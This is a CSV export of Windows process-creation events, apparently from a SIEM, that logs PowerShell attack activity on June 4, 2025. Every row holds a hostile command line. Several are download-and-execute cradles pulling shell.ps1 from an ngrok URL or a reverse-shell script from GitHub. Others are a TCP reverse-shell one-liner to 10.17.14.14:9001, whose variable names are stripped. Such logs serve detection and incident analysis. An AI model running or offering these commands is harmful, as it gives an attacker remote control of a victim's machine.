"@timestamp","process.name","process.command_line","process.args","event.code","winlog.event_id"
"Jun 4, 2025 @ 21:07:43.327","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)",behavior,"-"
"Jun 4, 2025 @ 21:07:43.299","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)","-","-"
"Jun 4, 2025 @ 21:07:43.245","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)",behavior,"-"
"Jun 4, 2025 @ 21:07:43.121","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -c "" = New-Object System.Net.Sockets.TCPClient('10.17.14.14',9001); = .GetStream();[byte[]] = 0..65535|%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -nop, -c,  = New-Object System.Net.Sockets.TCPClient('10.17.14.14',9001); = .GetStream();[byte[]] = 0..65535|%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()","-","-"
"Jun 4, 2025 @ 21:07:43.121","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -c "" = New-Object System.Net.Sockets.TCPClient('10.17.14.14',9001); = .GetStream();[byte[]] = 0..65535|%%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -nop, -c,  = New-Object System.Net.Sockets.TCPClient('10.17.14.14',9001); = .GetStream();[byte[]] = 0..65535|%%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String ); =  + 'PS ' + (pwd).Path + '> '; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()",1,1
"Jun 4, 2025 @ 21:07:37.803","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)","-","-"
"Jun 4, 2025 @ 21:07:37.803","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘ https://8edc-2401-4900-9156-fb4c-31f2-a653-5640-e4c9.ngrok-free.app/shell.ps1’)",1,1
"Jun 4, 2025 @ 21:03:12.364","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)",behavior,"-"
"Jun 4, 2025 @ 21:03:06.892","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)","-","-"
"Jun 4, 2025 @ 21:03:06.892","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -command ""iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -command, iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/gh0x0st/Get-ReverseShell/refs/heads/main/get-reverseshell.ps1’)",1,1
